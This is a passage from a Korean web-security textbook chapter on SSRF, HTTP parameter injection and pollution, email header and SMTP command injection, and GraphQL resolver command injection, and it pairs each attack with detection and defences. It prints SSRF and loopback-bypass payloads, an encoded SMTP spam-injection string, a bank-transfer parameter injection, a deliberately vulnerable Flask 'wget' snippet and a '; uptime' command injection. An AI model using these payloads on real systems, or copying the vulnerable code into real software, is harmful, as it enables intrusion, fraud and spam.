서버 측 리다이렉션 취약점은 애플리케이션이 사용자가 통제하는 입력을, 백엔드 HTTP 요청으로 가져올 URL에 심을 때 생긴다. 사용자 입력이 URL 전체를 이룰 수도, 애플리케이션이 접미사를 붙이는 등 일부 처리를 할 수도 있다. 백엔드 요청은 공개 인터넷의 도메인일 수도, 사용자가 직접 접근 못 하는 내부 서버일 수도 있다. 이 기법은 여러 내부·외부 컴포넌트를 하나의 프런트엔드 애플리케이션으로 엮어, 그 애플리케이션이 다른 시스템을 대신해 접근 제어·세션 관리를 처리하게 할 때 자주 쓰인다.

`loc` 파라미터가 클라이언트가 쓸 CSS 파일 버전을 지정하는 예를 보자.

```
POST /account/home HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: www.example-books.com
Content-Length: 65

view=default&loc=static.example-books.net/css/style.css
```

`loc`에 대한 검증이 없으면 공격자는 임의의 호스트명을 지정할 수 있다. 애플리케이션이 그 리소스를 가져오므로, 잠재적으로 민감한 백엔드 서비스에 대한 프록시로 애플리케이션을 쓸 수 있다. 다음 예는 백엔드 SSH 서비스에 연결하게 한다.

```
view=default&loc=192.168.0.1:22
```

응답에 요청한 SSH 서비스의 배너가 실려 돌아온다.

```
HTTP/1.1 200 OK
Connection: close

SSH-2.0-OpenSSH_4.2
Protocol mismatch.
```

이 배너 반환이 SSRF의 성공 신호다. 공격자는 취약한 애플리케이션을 사실상 **오픈 HTTP 프록시**로 삼아 여러 후속 공격을 편다. 인터넷의 제3자 시스템을 공격하되 트래픽이 취약 서버에서 온 것처럼 보이게 하고, 조직 내부망의 호스트에 연결해 인터넷에서 직접 못 닿는 표적에 도달하고, 애플리케이션 서버 자신에서 도는 다른 서비스에 연결해 방화벽 제한을 우회하고 신뢰 관계를 딛고 인증을 건너뛰며, 공격자가 통제하는 콘텐츠를 응답에 포함시켜 XSS를 전달한다.

여기서 이 책이 앞서 다룬 두 개념과의 경계를 분명히 해야 한다. **애플리케이션 서버가 뜻하지 않게 프록시로 동작하는 문제**는 12.8절에서 서버 오설정 관점으로 다뤘다. 그 절이 "서버가 프록시가 되어서는 안 되는데 되어 버린" 오설정을 다뤘다면, 이 절은 애플리케이션 로직이 **의도적으로** 사용자 URL을 가져오다가 SSRF가 되는 경우다. 또한 프록시가 임의 목적지로 터널을 뚫는 문제는 13.10절의 CONNECT 메서드 남용과 같은 계열이다 — 중간자가 임의의 목적지로 커넥션을 열 때 생기는 위험.

탐지 절차는 다음과 같다. 호스트명·IP·전체 URL을 담은 것으로 보이는 요청 파라미터를 식별하고, 각각을 비슷한 다른 리소스로 바꿔 그 리소스가 응답에 나타나는지 본다. 내가 통제하는 인터넷 서버를 가리키는 URL을 지정하고 그 서버로 들어오는 연결을 감시한다. 연결이 없으면 응답 시간을 감시한다 — 지연이 있으면 아웃바운드 제한으로 백엔드 요청이 타임아웃되는 것일 수 있다. 임의 URL 연결에 성공하면 포트 지정 가능 여부(`http://target:22`)를 확인하고, 성공하면 내부망을 포트 스캔하고, 애플리케이션 서버의 루프백 주소에서 도는 서비스에 연결하고, 내가 통제하는 페이지를 응답에 로드해 XSS를 전달한다.

ASP.NET의 `Server.Transfer()`, `Server.Execute()` 같은 일부 리다이렉션 API는 같은 호스트의 상대 URL로만 리다이렉션을 허용한다. 그럼에도 이런 메서드에 사용자 입력을 넘기는 기능은, 플랫폼 수준 인증으로 보호되는 서버 리소스에 접근하기 위해 신뢰 관계를 딛는 데 익스플로잇될 수 있다.

### 28.8.1 서버가 임의의 주소로 커넥션을 열 때

SSRF가 왜 이토록 위험한지는 Part I의 네트워크 지식 없이는 온전히 설명되지 않는다. 이 절이 그 연결을 명시한다.

일반적인 웹 공격에서 공격자의 위치는 방화벽 **바깥**이다. 조직은 경계 방화벽으로 인터넷에서 내부망으로 들어오는 트래픽을 통제하고, 내부 서비스 — 관리 인터페이스, 데이터베이스, 메시지 큐, 서비스 디스커버리 — 를 인터넷에서 도달 불가능하게 둔다. 이 배치의 암묵적 전제는 하나다. **"내부망에서 오는 커넥션은 신뢰할 수 있다."** 방화벽은 출발지 주소로 신뢰를 판단하기 때문이다.

SSRF는 이 전제를 정면으로 무너뜨린다. 취약한 애플리케이션 서버는 방화벽 **안쪽**에 있다. 공격자가 그 서버로 하여금 임의의 주소로 커넥션을 열게 만드는 순간, 커넥션의 출발지는 신뢰받는 내부 서버가 된다. **방화벽 안쪽 전체가 공격 표면이 된다.** 4.6절에서 우리는 "주소가 신원이 아닌 환경"을 다뤘다 — NAT 뒤에서 IP 하나가 여러 사용자를 가리키고, `X-Forwarded-For`가 위조 가능하다는 것. SSRF는 그 명제의 서버 측 대응이다. **출발지 주소로 신뢰를 판단하는 모든 시스템은, 신뢰받는 위치에서 커넥션을 여는 대리자(proxy)를 공격자가 얻는 순간 무너진다.**

이 공격을 막으려는 방어는 대개 목적지 주소를 검사한다 — "`localhost`나 `127.0.0.1`로 가는 요청은 거부한다"는 식으로. 그러나 **하나의 주소를 표기하는 방법은 놀랍도록 많다.** IP 주소는 사람이 읽는 점 구분 10진 표기 외에도 여러 형태로 쓸 수 있다.

**표 28-2. `127.0.0.1`을 표기하는 여러 방법**

| 표기 방식 | 예 |
|---|---|
| 점 구분 10진(표준) | `127.0.0.1` |
| 10진 정수 | `2130706433` |
| 8진 | `0177.0.0.1` |
| 16진 | `0x7f.0x0.0x0.0x1`, `0x7f000001` |
| 부분 생략 | `127.1` |
| IPv6 루프백 | `[::1]`, `[::ffff:127.0.0.1]` |
| 대체 도메인 | 공격자가 `127.0.0.1`로 해석되게 설정한 DNS 이름 |

블랙리스트가 `127.0.0.1`과 `localhost`만 막으면 위 표의 나머지가 모두 통과한다. 게다가 주소 검증이 **이름 해석 전에** 이뤄지면, 공격자가 소유한 도메인이 검증 시점엔 무해한 공개 IP를 반환하고 실제 커넥션 시점엔 내부 IP를 반환하도록 만들 수 있다 — 이것이 **DNS 리바인딩(DNS rebinding)** 이다(→ 2.8, 36.6). DNS 리바인딩이 성립하는 근본 이유는 2.3절에서 정리한 이름 해석 구조 — 이름과 IP의 결속이 TTL로 통제되며 시점마다 달라질 수 있다는 것 — 에 있다. 검증하는 순간의 IP와 접속하는 순간의 IP가 다를 수 있다는 사실이, 목적지 기반 블랙리스트를 근본적으로 신뢰할 수 없게 만든다.

리다이렉트 추종도 같은 함정이다. 애플리케이션이 무해한 URL을 검증하고 그 URL을 가져오는데, 그 URL이 `3xx` 응답으로 내부 주소로 리다이렉트하면, 리다이렉트를 따라가는 HTTP 클라이언트가 검증을 거치지 않고 내부 주소에 도달한다.

따라서 SSRF 방어는 목적지 블랙리스트가 아니라 **화이트리스트**여야 한다 — 애플리케이션이 연결해야 할 알려진 호스트의 목록. 그리고 화이트리스트 검증은 이름 해석 후의 최종 IP에 대해, 리다이렉트를 따라간 후에도 다시 수행돼야 한다. 여기에 네트워크 분리(→ 46.6)를 더해, 취약한 애플리케이션이 애초에 민감한 내부 서비스에 네트워크 수준에서 도달할 수 없게 하는 것이 심층 방어다.

> **이 책의 범위를 넘어서**
>
> 오늘날 SSRF가 특히 치명적인 것은 클라우드 인프라의 **메타데이터 서비스** 때문이다. 많은 클라우드 제공자가 인스턴스 자신의 정보 — 할당된 역할, 사용 중인 자격증명 — 를 읽는 메타데이터 엔드포인트를 두는데, SSRF로 이 엔드포인트에 도달하면 인스턴스의 자격증명을 통째로 탈취할 수 있다. 그러나 클라우드 메타데이터 서비스의 구체적 주소·프로토콜·최신 완화책(IMDSv2 등)은 이 책이 근거로 삼는 다섯 권의 범위 밖이므로 본문에서 다루지 않는다. 현대 컨테이너 탈출과 역직렬화 공격의 현대적 형태도 마찬가지로 이 책의 범위 밖이다. 원리는 동일하다 — 서버가 신뢰받는 위치에서 임의 주소로 커넥션을 연다는 것.

### HTTP 파라미터 인젝션 (HPI)과 오염 (HPP)

HPI는 사용자가 준 파라미터가 백엔드 HTTP 요청의 파라미터로 쓰일 때 생긴다. SOAP 인젝션에 취약했던 은행 이체 기능의 변형을 보자.

```
POST /bank/Default.aspx HTTP/1.0
Host: mdsec.net
Content-Length: 65

FromAccount=18281008&Amount=1430&ToAccount=08447656&Submit=Submit
```

이 프런트엔드 요청은 애플리케이션이 은행 인프라 내 다른 웹 서버로 백엔드 요청을 만들게 한다. 이때 일부 파라미터 값이 복사된다.

```
POST /doTransfer.asp HTTP/1.0
Host: mdsec-mgr.int.mdsec.net
Content-Length: 44

fromacc=18281008&amount=1430&toacc=08447656
```

백엔드 서버는 이 요청으로 자금이 확보됐는지 확인하고 이체한다. 그런데 프런트엔드 서버는 `clearedfunds=true`를 실어 그 확인을 건너뛰게 할 수 있다. 이 동작을 아는 공격자는 백엔드 요청에 `clearedfunds`를 주입하려 시도한다 — 기존 파라미터 값 끝에 덧붙이되, 이름/값을 나누는 `&`와 `=`를 URL 인코딩해서.

```
FromAccount=18281008&Amount=1430&ToAccount=08447656%26clearedfunds%3dtrue&Submit=Submit
```

애플리케이션 서버가 이 요청을 처리하며 값을 URL 디코딩하면 `ToAccount` 값이 `08447656&clearedfunds=true`가 되고, 이것이 검증 없이 백엔드로 넘어가면 확인이 우회된다.

이미 존재하는 파라미터를 표적으로 삼는 경우가 **HPP**다. HTTP 명세는 같은 이름의 파라미터가 여럿일 때 서버가 어떻게 동작해야 하는지 규정하지 않는다. 실제로 서버마다 다르다 — 첫 인스턴스를 쓰거나, 마지막을 쓰거나, 값을 연결하거나, 배열을 만든다. 백엔드 서버가 첫 인스턴스를 쓴다면 공격을 `FromAccount`에 넣고, 마지막을 쓴다면 `ToAccount`에 넣어, 서버가 설정한 `clearedfunds=false`를 자기 값으로 덮어쓴다. HPP 결과는 표적 서버가 중복 파라미터를 어떻게 다루는지와 삽입 지점에 크게 좌우된다. WAF나 리버스 프록시가 요청을 한 방식으로 처리하고 웹 애플리케이션이 다른 방식으로 처리하면, 변수를 버리거나 서로 다른 조각으로 문자열을 만드는 심각한 불일치가 생긴다(→ 13.12, 파싱 불일치가 발생하는 지점).

URL 번역도 HPI·HPP의 무대다. 많은 서버가 도착한 URL을 백엔드 함수에 매핑하려 재작성하며, REST 스타일 파라미터나 커스텀 내비게이션 래퍼에서도 이 동작이 나타난다. Apache `mod_rewrite`가 `/pub/user/marcus`를 `/inc/user_mgr.php?mode=view&name=marcus`로 바꾼다면, 공격자가 `/pub/user/marcus%26mode=edit`를 요청해 재작성된 URL에 두 번째 `mode` 파라미터를 주입할 수 있다. PHP 플랫폼은 `mode`를 `edit`로 취급하므로 공격이 성공한다.

HPI 탐지는 각 파라미터에 `%26foo%3dbar`(URL 인코딩된 `&foo=bar`), `%3bfoo%3dbar`(`;foo=bar`), `%2526foo%253dbar`(이중 인코딩)를 덧붙여, 애플리케이션이 원래 파라미터가 수정되지 않은 것처럼 동작하는 경우를 찾는 것이다. 그다음 알려진 파라미터를 여러 지점에 주입해 기존 값을 덮어쓸 수 있는지 본다. SOAP 인젝션과 달리 예상치 못한 파라미터 주입은 대개 오류를 내지 않으므로, 성공적 공격은 백엔드 파라미터를 정확히 알아야 한다. 블랙박스에선 어렵지만 제3자 컴포넌트를 쓰는 애플리케이션이면 그 코드를 구해 연구할 수 있다.

이 절은 33.5절과 반드시 구별해야 한다. **CSRF는 클라이언트(피해자 브라우저)가 공격자 의도대로 요청을 보내게 만드는 것**이고, **SSRF는 서버가 공격자 의도대로 요청을 보내게 만드는 것**이다. 요청을 보내는 주체가 다르다. 33.5절에서 이 구별을 방어 관점에서 다시 다룬다.

> **이 절이 뒷받침하는 것**
>
> - 서버가 임의 주소로 커넥션을 열 때 방화벽 안쪽이 공격 표면이 되는 원리 → **2.3** (이름 해석 흐름), **2.8** (DNS 리바인딩), **4.6** (주소가 신원이 아닌 환경), **36.6** (브라우저를 통한 내부망 공격)
> - 애플리케이션 서버가 프록시로 동작하는 문제, 중간자가 임의 목적지로 커넥션을 여는 위험 → **12.8** (프록시로 동작해버리는 앱서버), **13.10** (CONNECT 터널)
> - 파싱 불일치가 HPP를 증폭하는 지점, SSRF와 CSRF의 구별 → **13.12** (중간자 파싱 불일치), **33.5** (CSRF와의 구분)

## 28.9 메일 서비스 인젝션 — 이메일 헤더 조작, SMTP 명령 인젝션, 탐지, 방어

많은 애플리케이션이 사용자가 메시지를 보내는 기능 — 지원팀에 문제 신고, 사이트 피드백 — 을 둔다. 대개 메일(SMTP) 서버와 연동해 구현하며, 사용자 입력이 애플리케이션 서버가 메일 서버와 나누는 SMTP 대화에 삽입된다. 걸러지지 않은 조작 입력을 넣을 수 있으면 공격자는 임의의 SMTP 명령을 이 대화에 주입할 수 있다. SMTP 인젝션은 스패머가 취약한 메일 폼을 찾아 대량 스팸을 뿌리는 데 자주 악용된다.

**이 취약점의 뿌리는 27장·28장 내내 반복된 구조와 같다** — 데이터(사용자가 준 주소·제목·본문)와 구분자(개행 문자, SMTP 명령)가 같은 채널을 공유한다.

### 이메일 헤더 조작

온라인 서점의 사이트 피드백 폼을 보자. 사용자가 발신 주소와 메시지 내용을 지정하면, 애플리케이션이 이를 PHP `mail()` 명령에 넘겨 메일을 구성한다. 생성되는 메일은 다음과 같다.

```
To: support@example-books.com
From: reader@example.com
Subject: Site problem

Confirm Order page doesn't load
```

PHP `mail()`은 `additional_headers` 파라미터로 발신 주소를 설정하는데, 이 파라미터는 개행 문자로 각 헤더를 구분해 `Cc`, `Bcc` 같은 다른 헤더도 지정한다. 따라서 공격자는 발신 필드에 헤더를 주입해 메시지를 임의 수신자에게 보낼 수 있다.

```
From 필드 입력:  reader@example.com%0aBcc: everyone@othercompany.example.com
```

이는 다음 메시지를 생성한다.

```
To: support@example-books.com
From: reader@example.com
Bcc: everyone@othercompany.example.com
Subject: Site problem

Confirm Order page doesn't load
```

개행 문자 하나(`%0a`)가 데이터(발신 주소)의 자리를 벗어나 새 헤더라는 구조를 만들었다. 8.7절의 HTTP 헤더 인젝션·응답 분할과 정확히 같은 구조 — CR/LF가 헤더 경계를 만드는 것 — 가 SMTP 헤더에서 재현된 것이다.

### SMTP 명령 인젝션

어떤 경우엔 애플리케이션이 SMTP 대화를 직접 수행하거나 다른 컴포넌트에 넘겨 수행한다. 이때 대화에 임의의 SMTP 명령을 직접 주입해 애플리케이션이 생성하는 메시지를 완전히 장악할 수 있다. 다음 형태로 피드백을 제출하는 애플리케이션을 보자.

```
POST feedback.php HTTP/1.1
Host: www.example-books.com
Content-Length: 56

From=reader@example.com&Subject=Site+feedback&Message=foo
```

이는 다음 SMTP 대화를 수행한다.

```
MAIL FROM: reader@example.com
RCPT TO: feedback@example-books.com
DATA
From: reader@example.com
To: feedback@example-books.com
Subject: Site feedback
foo
```

SMTP 클라이언트는 `DATA` 명령 뒤에 헤더와 본문을 보내고, 자기 줄에 점 하나(`.`)를 보내 메시지 완료를 알린 뒤, 이어서 다른 명령으로 다른 메시지를 보낼 수 있다. 공격자는 제어하는 필드에 임의의 SMTP 명령을 주입한다. `Subject` 필드에 주입하면 다음처럼 된다(URL 인코딩된 CR/LF `%0d%0a`와 점 `%2e` 사용).

```
Subject=Site+feedback%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+spam@spammer.example
%0d%0aRCPT+TO:+victim@example.com%0d%0aDATA%0d%0aFrom:+spam@spammer.example
%0d%0aTo:+victim@example.com%0d%0aSubject:+Cheap+stuff%0d%0aBlah%0d%0a%2e%0d%0a
```

취약하면 두 개의 메일 메시지가 생성되고, 두 번째는 완전히 공격자 통제 하에 있다. 점 하나로 첫 메시지를 종료하고, 새 `MAIL FROM`/`RCPT TO`/`DATA` 시퀀스로 두 번째 메시지를 통째로 구성한 것이다.

### 탐지와 방어

메일 기능을 효과적으로 탐침하려면 이메일 관련 함수에 제출되는 모든 파라미터를 — 얼핏 메시지 내용과 무관해 보이는 것까지 — 표적으로 삼고, 각 공격 유형을 Windows·UNIX 개행 문자 양쪽으로 테스트한다. 각 파라미터에 다음 유형의 문자열을 넣는다.

```
<내이메일>%0aCc:<내이메일>
<내이메일>%0d%0aBcc:<내이메일>
%0d%0aDATA%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+<내이메일>%0d%0aRCPT+TO:+<내이메일>...
```

애플리케이션 응답이 취약 여부를 알려 주지 않는 경우가 많으므로, 지정한 이메일 주소로 메일이 오는지 감시한다. 관련 요청을 생성하는 HTML 폼을 면밀히 검토하면 서버 측 소프트웨어의 단서나, 직접 수정 가능한 숨겨진 `To` 주소 필드를 발견할 수 있다. **지원팀 메일 기능은 주변적이라 여겨져 주 기능과 같은 보안 기준·테스트를 받지 않는 경우가 많고**, 특이한 백엔드 컴포넌트를 다루는 만큼 관련 OS 명령을 직접 호출해 구현되는 경우도 많으므로, SMTP 인젝션뿐 아니라 OS 명령 인젝션(→ 28.1)도 함께 검토한다.

방어는 이메일 함수나 SMTP 대화에 넘기는 모든 사용자 데이터를 목적에 맞게 최대한 엄격히 검증하는 것이다. 이메일 주소는 적절한 정규식으로 검사하되 **반드시 개행 문자를 거부**한다. 메시지 제목은 개행 문자를 담을 수 없게 하고 적절한 길이로 제한한다. 메시지 내용이 SMTP 대화에 직접 쓰이면 점 하나만 있는 줄을 금지한다.

여기서도 이 책의 방어 원리가 일관된다. 개행 문자를 "정제"하려 들면 새로운 우회를 부른다. 그보다 이메일 주소·제목을 각각의 **도메인 프리미티브**로 다뤄, 개행을 포함할 수 없는 타입으로 만들면 검증되지 않은 문자열이 애초에 SMTP 대화에 도달하지 못한다(→ 27.10, 44.1).

## 28.10 GraphQL 리졸버를 통한 OS 명령 인젝션과 SSRF

이 절의 논지는 27.14절과 같다. **GraphQL은 새로운 인젝션이 아니라 새로운 진입점이다.** 27.14절에서 리졸버가 SQL을 문자열 연접으로 만들면 REST에서와 똑같은 SQL 인젝션이 생겼다. 이 절에서는 리졸버가 SQL이 아니라 **운영체제 명령**을 만들거나 **아웃바운드 HTTP 요청**을 보낼 때, 이 장이 다룬 OS 명령 인젝션(28.1)과 SSRF(28.8)가 그대로 재현됨을 본다. 진입점은 같은 GraphQL 인자이지만, 도달하는 백엔드 컴포넌트가 다르다.

### 리졸버를 통한 OS 명령 인젝션

OS 명령 인젝션은 리졸버 함수가 GraphQL 필드의 인자를 필요한 검증 없이 받을 때 생긴다. 백엔드 작업에 시스템 셸 라이브러리를 쓰는 애플리케이션은 흔하다 — `ping`으로 원격 서버 생존 확인, `wget`으로 파일 다운로드, `zip`·`tar`로 압축, `cp`·`rsync`로 백업. 시스템 유틸리티를 쓴다는 사실 자체가 취약점을 뜻하진 않지만, **그 명령이 임의의 사용자 입력에 영향받으면** 위험해진다. 소스 코드 리뷰 시 다음 라이브러리·함수가 커스텀 사용자 입력으로 명령을 구성하는지 본다 — Python의 `subprocess`·`os`·`exec`·`eval`, PHP의 `system`·`shell_exec`·`exec`, Java의 `Runtime.exec()`, Node.js의 `child_process`·`exec`·`spawn`.

Flask로 파일을 다운로드하는 리졸버를 보자.

```python
@app.route('/download', methods=['POST'])
def download():
    url = request.form['url']
    os.system('wget {} -P /data/downloads'.format(url))
    return redirect('/dashboard')
```

사용자가 `http://example.com/file.zip`을 주면 `wget http://example.com/file.zip -P /data/downloads`가 실행된다. 문제가 여럿이다. 어떤 URL이든 허용되고 형식 검증도 없어 내부 URL·사설 IP로 SSRF가 가능하며(다음 소절), 입력이 `wget` 명령에 직접 삽입되므로 세미콜론(`;`)으로 명령을 끊고 새 명령을 시작해 OS 명령 인젝션을 수행할 수 있다.

GraphQL에서는 리졸버가 필드 인자를 받아 셸 명령을 구성할 때 이것이 재현된다. 필드 이름에 `system`이 들어간 것(`systemUpdate`, `systemHealth`, `systemDiagnostics`, `systemDebug`)은 내부에서 시스템 셸 명령을 쓴다는 강한 힌트다. 홈 라우터의 디버그·진단 페이지가 그렇듯, 이런 인터페이스는 `ping`·`traceroute` 같은 네트워크 유틸리티를 써서 OS 명령 인젝션이 흔히 존재한다.

`systemDebug` 필드가 인자 `arg`(타입 String)를 받는다고 하자. 인자 없이 질의하면 `ps` 명령 출력이 반환된다.

```
query {
  systemDebug
}
```

`arg`에 `ef`를 주면(`ps`의 유효 인자) 출력 형식이 바뀐다 — 인자가 `ps` 명령에 연접됨을 시사한다. 세미콜론으로 자기 명령을 주입한다.

```
query {
  systemDebug(arg:"; uptime")
}
```

출력에 시스템 부하 정보가 섞여 나오면 OS 명령 인젝션이 확인된다. 문자 제한이나 방화벽 때문에 수동 테스트가 어려우면 Commix 같은 명령 인젝션 프레임워크로 여러 문자 변형 — `;`(명령 구분), `&`(백그라운드), `&&`(AND), `||`(OR) — 을 자동 시도하고, 시간 지연 추론으로 성공을 판별한다(→ 28.2와 같은 원리).

### 리졸버를 통한 SSRF

SSRF는 서버를 대신해 요청을 수행하게 하는 공격이다(→ 28.8). GraphQL도 예외가 아니다. 애플리케이션이 클라이언트로부터 URL을 받아 특정 행위 — 이미지 다운로드, 페이스트 가져오기 — 를 수행하는 기능이 흔하고, 입력 검증이 없으면 공격자가 사설·비라우팅 IP(`10.10.0.0/24`, `172.16.0.0/24`)나 내부 URL을 주어 내부 서비스에 도달한다.

DVGA(Damn Vulnerable GraphQL Application)의 `importPaste` 뮤테이션이 좋은 예다. 이것은 `host`, `port`, `path`, `scheme` 네 인자로 URL을 조립해 HTTP GET 요청을 만든다.

```
mutation {
  importPaste(scheme: "https", host:"pastebin.example", port:443, path:"/raw/abc123") {
    result
  }
}
```

네 인자가 URL의 구성 요소이므로, 스킴·도메인·포트를 마음대로 지정해 DVGA 네트워크의 다른 서비스를 탐침할 수 있다. 내부 목적지를 지정하면 SSRF가 된다.

```
mutation {
  importPaste(scheme: "http", host:"localhost", port:7773, path:"/ssrf") {
    result
  }
}
```

이 뮤테이션은 DVGA가 내부의 열리지 않은(또는 외부에서 접근 불가한) 포트로 HTTP 요청을 만들게 한다. 내부 리스너가 이 요청을 받으면, 공격자가 직접 도달할 수 없는 서비스에 DVGA를 통해 도달한 것이다. 특정 포트에 대한 이 공격은 더 좁혀 **XSPA(cross-site port attack)** 라 부르며, SSRF 범주에 든다.

SSRF에는 세 종류가 있다. **블라인드 SSRF**는 취약점 존재의 시각적 증거가 없어, 대역 외 도구로 원격 서버의 트래픽을 잡거나 인위적 지연으로 타이밍 분석해 추론한다. **세미 블라인드 SSRF**는 오류나 부분 응답 같은 일부 증거를 준다. **논 블라인드(full-read) SSRF**는 서버가 전체 응답을 공격자에게 돌려주는, 침투 테스터가 가장 반기는 종류다. 리스너가 응답을 주지 않아 클라이언트가 멈추는 것으로만 열린 포트를 아는 경우가 블라인드 SSRF의 전형이다.

취약 지점을 찾을 때는 뮤테이션·질의를 가리지 않고 모든 연산을 본다. SSRF는 대개 스칼라 값을 받는 인자에 영향을 준다. 필드 이름에 `fetch`, `import`, `download`, `read` 같은 동사가 들어가거나, 인자 이름이 `ip`, `url`, `host`, `network`, `domain`, `site`, `target`, `img_url`, `target_url`, `remote_url` 같으면 아웃바운드 커넥션을 시사한다.

방어는 28.8절의 원리와 같되 GraphQL 인자에 초점을 둔다. **입력 검증**으로 URL을 받는 인자에 위험 문자를 거부하고 허가된 URL만 받는다. **네트워크 분리**로 애플리케이션이 관련 내부망하고만 통신하게 한다 — 스테이징망의 취약한 GraphQL API가 프로덕션망의 다른 API에 닿아선 안 된다(→ 46.6). **위협 모델링**으로 SSRF 가능성이 있는 질의·뮤테이션을 개발 생애주기 초기에 식별하고, **최소 권한 원칙**으로 폭발 반경을 줄인다.

> **이 절이 뒷받침하는 것**
>
> - GraphQL이 새 인젝션이 아니라 새 진입점이라는 논지 → **27.14** (GraphQL을 경유한 SQL 인젝션), **38장** (GraphQL 공격 표면)
> - 네트워크 분리로 SSRF의 폭발 반경을 줄이는 방어 → **46.6** (서비스 디스커버리와 로드 밸런싱), **47.10** (서비스 간 통신은 다시 네트워크다)

## 이 장의 요약

- **백엔드 컴포넌트 공격은 27장 인젝션 구조가 데이터 저장소 밖의 컴포넌트에서 재현되는 것이다.** 사용자 입력이 셸에 들어가면 OS 명령 인젝션, 파일 경로에 들어가면 경로 순회, XML 파서에 들어가면 XXE, 아웃바운드 HTTP 요청에 들어가면 SSRF, SMTP 대화에 들어가면 메일 인젝션이다. 27.7절이 DB를 경유해 운영체제에 이르렀다면, 이 장은 애플리케이션에서 곧장 이른다.
- **OS 명령 인젝션의 방어는 필터가 아니라 셸을 거치지 않는 API다.** `Runtime.exec`·`Process.Start`처럼 명령을 이름과 인자로 실행하면 명령 사슬 잇기·리다이렉션이 원천 차단된다. 완전한 명령 주입이 막혀도 `<`·`>` 리다이렉션과 명령줄 인자로 파일을 읽고 쓸 수 있다.
- **경로 순회의 우회 기법은 새 발명이 아니라 7장 인코딩·정규화 논의의 응용이다.** 오버롱 UTF-8, 이중 인코딩, 널 바이트, `....//` 겹치기, 확장자 강제 우회는 모두 정규화 결함의 파일시스템 판이다. 방어는 정규화 후 검사·화이트리스트·`getCanonicalPath` 확인·chroot의 심층 방어다.
- **28.6은 이 책의 고유한 기여다.** XXE/Billion Laughs를 네 겹 — 공격의 구조, 파서 설정, "필요 없는 기능은 끈다"는 설계 마인드셋, 운영 제약과 심층 보안 — 으로 다뤘다. 확장은 XML 명세에 부합하는 것이므로 문제를 수신 시스템의 입력 검증 문제로 다뤄야 하며, 파서 설정·어휘 스캔·운영 제약을 함께 배치하는 것이 심층 보안이다.
- **SSRF가 위험한 것은 서버가 신뢰받는 위치에서 임의 주소로 커넥션을 열기 때문이다.** 그 순간 방화벽 안쪽 전체가 공격 표면이 된다. 목적지 블랙리스트는 주소 표기의 다양성(10진 정수·8진·16진·IPv6)과 DNS 리바인딩·리다이렉트 추종으로 무력화되므로, 방어는 이름 해석 후 최종 IP에 대한 화이트리스트와 네트워크 분리여야 한다.
- **SOAP·HPI·메일 인젝션은 모두 데이터와 구분자가 같은 채널을 공유하는 구조다.** SOAP는 `<`·`>`·`/`, HPI는 URL 인코딩된 `&`·`=`, 메일은 개행 문자가 구분자다. 방어는 경계 검증과 메타문자 인코딩, 그리고 개행을 담을 수 없는 도메인 프리미티브다.
- **GraphQL은 새 인젝션이 아니라 새 진입점이다.** 리졸버가 셸 명령을 문자열 연접으로 만들면 OS 명령 인젝션이, 아웃바운드 URL을 조립하면 SSRF가 REST에서와 똑같이 생기고, 방어도 똑같다. `system`으로 시작하는 필드명과 `url`·`host` 류 인자명이 단서다.

## 이어지는 장

이 장은 사용자 입력이 서버 측 백엔드 컴포넌트 — 운영체제, 파일시스템, XML 파서, 아웃바운드 HTTP, 메일 서버 — 를 겨냥할 때 무엇이 되는지를 다뤘다. 27장과 28장을 합치면, "임의의 바이트가 검증 없이 서버 코드에 도달할 수 있다"는 전제가 각 백엔드 컴포넌트에서 어떤 이름의 재앙이 되는지의 전수 조사가 완성된다. 남은 것은 인젝션이 아니라 다른 종류의 결함이다.

29장은 **애플리케이션 로직 결함**으로 넘어간다. 지금까지의 공격은 모두 인터프리터의 문법이나 컴포넌트의 API를 딛는, 기계적으로 재현 가능한 결함이었다. 로직 결함은 다르다. 스캐너가 찾지 못하고, 문법을 깨지도 않으며, 오직 애플리케이션이 세계를 잘못 모델링했기 때문에 생긴다. 온라인 서점의 미수금 원장과 재고 시스템이 그 무대가 된다.

그리고 이 장이 반복해 예고한 설계 관점 — 필요 없는 기능은 끄고(28.6), 위험한 값이 존재할 수 없게 하며(28.2·28.9), 여러 층으로 방어하고(28.6·28.8), 검증 전에 복구하지 않는다(28.3) — 는 Part IX에서 회수된다. 특히 28.6의 네 겹 방어는 41.8절(운영 제약과 심층 보안), 43.1절(불변성), 45.5절(벌크헤드)에서 설계 원칙의 언어로 완성된다. 이 장에서 우리는 하나의 XML 취약점을 다루는 방식이 곧 이 책 전체의 설계 철학임을 보였다. 그 철학을 코드가 저절로 지키게 만드는 방법이 설계다.
